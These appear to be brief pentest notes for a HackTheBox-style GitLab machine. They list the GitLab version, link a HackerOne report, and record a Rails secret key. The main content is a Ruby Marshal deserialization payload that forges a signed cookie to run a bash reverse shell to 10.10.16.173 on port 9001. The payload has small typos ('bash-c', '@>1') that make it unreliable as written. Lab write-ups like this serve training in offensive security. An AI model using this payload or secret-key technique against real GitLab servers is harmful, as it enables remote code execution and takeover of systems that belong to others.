# gitlab.laboratory.htb

## Version

![](Pasted%20image%2020210530145505.png)

- Released February 2020

## Vuln

Link: [Vulnerability Write-Up](https://hackerone.com/reports/827052)

![](Pasted%20image%2020210530145754.png)

## Secret Key

3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3

## Deserialize Payload

```
request = ActionDispatch::Request.new(Rails.application.env\_config) 
request.env\["action\_dispatch.cookies\_serializer"\] = :marshal 
cookies = request.cookie\_jar 

erb \= ERB.new("<%= \`bash-c 'bash -I >& /dev/tcp/10.10.16.173/9001 @>1'\` %>") 
depr \= ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new) 
cookies.signed\[:cookie\] = depr 
puts cookies\[:cookie\]
```